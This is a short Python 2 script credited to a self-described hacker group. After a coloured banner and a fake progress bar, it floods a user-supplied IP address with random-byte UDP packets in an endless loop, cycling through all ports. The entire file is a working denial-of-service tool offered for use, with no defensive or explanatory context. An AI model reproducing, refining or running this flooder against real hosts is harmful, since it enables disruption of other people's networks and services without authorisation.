
import sys
import os
import time
import socket
import random
#############:
W = '\033[1;34;40m'
Br = '\033[1;32;40m'
Bg = '\033[1;31;40m'
Y = '\033[1;32;40m'
Bb = '\033[1;32;40m'
Bm = '\033[1;32;40m'
Bc = '\033[1;32;40m'
M = '\033[1;34m'
C = '\033[1;31m'
D = '\033[1;32m'
#################
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print(C)
print("                   |=============================|")
print(D)
print("                         |=================|")
print(W)
print("                             |=========|")
print(M)
print("                               |=====|")
print(Br)
print("                                |===|")
print("\r")
print(C)
print("                        By ==>  Ali Elhafeth")

print(D)

print("                     & & & & & & & & & & & & & & & &")

print(W)

print(" -----[C] 2018------|| BlackHaT Sudan || - Member Of ZeroDayTeam||")
print
ip = raw_input("Enter IP  : ")
port = input("Enter Port       : ")

os.system("clear")
os.system("figlet Attack  Starting")
print(W)
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
